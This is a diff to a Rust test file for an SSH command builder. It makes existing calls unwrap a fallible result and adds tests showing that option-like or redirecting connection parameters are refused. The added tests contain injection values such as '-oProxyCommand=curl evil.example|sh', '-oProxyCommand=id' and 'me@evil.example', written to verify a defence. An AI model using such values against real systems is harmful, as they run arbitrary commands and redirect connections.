@@ -8,7 +8,7 @@ fn target_with_and_without_user() {
 
 #[test]
 fn exec_includes_keepalive_and_target() {
-    let argv = Host::new("box").user("me").exec("uptime");
+    let argv = Host::new("box").user("me").exec("uptime").unwrap();
     assert_eq!(argv[0], "ssh");
     assert!(argv.contains(&"ServerAliveInterval=15".to_string()));
     assert_eq!(argv[argv.len() - 2], "me@box");
@@ -19,7 +19,8 @@ fn exec_includes_keepalive_and_target() {
 fn control_master_enables_passphrase_caching() {
     let argv = Host::new("box")
         .control_path("/tmp/cm-%r@%h:%p")
-        .exec("true");
+        .exec("true")
+        .unwrap();
     assert!(argv.contains(&"ControlMaster=auto".to_string()));
     assert!(argv.iter().any(|a| a.starts_with("ControlPath=/tmp/cm")));
     assert!(argv.contains(&"ControlPersist=600".to_string()));
@@ -27,7 +28,7 @@ fn control_master_enables_passphrase_caching() {
 
 #[test]
 fn autossh_swaps_program() {
-    let argv = Host::new("box").autossh(true).exec("true");
+    let argv = Host::new("box").autossh(true).exec("true").unwrap();
     assert_eq!(argv[0], "autossh");
 }
 
@@ -36,7 +37,8 @@ fn port_and_identity_flags() {
     let argv = Host::new("box")
         .port(2222)
         .identity("/keys/id")
-        .exec("true");
+        .exec("true")
+        .unwrap();
     let joined = argv.join(" ");
     assert!(joined.contains("-p 2222"));
     assert!(joined.contains("-i /keys/id"));
@@ -44,7 +46,9 @@ fn port_and_identity_flags() {
 
 #[test]
 fn port_forward_spec() {
-    let argv = Host::new("box").port_forward(3000, "localhost", 8080);
+    let argv = Host::new("box")
+        .port_forward(3000, "localhost", 8080)
+        .unwrap();
     let joined = argv.join(" ");
     assert!(joined.contains("-N"));
     assert!(joined.contains("-L 3000:localhost:8080"));
@@ -152,6 +156,67 @@ fn branch_names_are_validated() {
 fn keepalive_zero_omits_option() {
     let mut h = Host::new("box");
     h.keepalive_secs = 0;
-    let argv = h.exec("true");
+    let argv = h.exec("true").unwrap();
     assert!(!argv.iter().any(|a| a.starts_with("ServerAliveInterval")));
+}
+
+// ── Connection-parameter injection ──────────────────────────────────────────
+//
+// The git-side arguments were already guarded. These cover the connection side:
+// OpenSSH has no `--` separator before its destination, so anything that lands
+// where the target belongs and starts with `-` is parsed as an option, and
+// `-oProxyCommand=…` makes ssh run an arbitrary *local* command.
+
+#[test]
+fn option_like_connection_parameters_are_refused() {
+    assert!(Host::new("-oProxyCommand=curl evil.example|sh")
+        .exec("true")
+        .is_err());
+    assert!(Host::new("box")
+        .user("-oProxyCommand=id")
+        .exec("true")
+        .is_err());
+    assert!(Host::new("box")
+        .identity("-oProxyCommand=id")
+        .exec("true")
+        .is_err());
+    assert!(Host::new("box")
+        .control_path("-oProxyCommand=id")
+        .exec("true")
+        .is_err());
+    assert!(Host::new("").exec("true").is_err());
+    // An ordinary host still builds.
+    assert!(Host::new("box").user("me").exec("true").is_ok());
+}
+
+#[test]
+fn a_user_cannot_redirect_the_connection_with_an_at_sign() {
+    // `user@host` splits on the first `@`, so an `@` inside the user field
+    // silently connects somewhere else.
+    assert!(Host::new("box")
+        .user("me@evil.example")
+        .exec("true")
+        .is_err());
+}
+
+#[test]
+fn forward_host_cannot_add_fields_to_the_spec() {
+    // `-L local:host:port` is colon-separated; a `:` in the host adds fields
+    // and re-points the tunnel.
+    let h = Host::new("box");
+    assert!(h
+        .port_forward(3000, "localhost:22:evil.example", 8080)
+        .is_err());
+    assert!(h.port_forward(3000, "-oProxyCommand=id", 8080).is_err());
+    assert!(h.port_forward(3000, "", 8080).is_err());
+    assert!(h.port_forward(3000, "localhost", 8080).is_ok());
+}
+
+#[test]
+fn worktree_commands_inherit_the_connection_checks() {
+    // A hostile connection must not be reachable through the git helpers
+    // either, even with well-formed repo and path arguments.
+    let hostile = Host::new("-oProxyCommand=id");
+    assert!(hostile.worktree_create("/repo", "/wt", None).is_err());
+    assert!(hostile.worktree_remove("/repo", "/wt").is_err());
 }
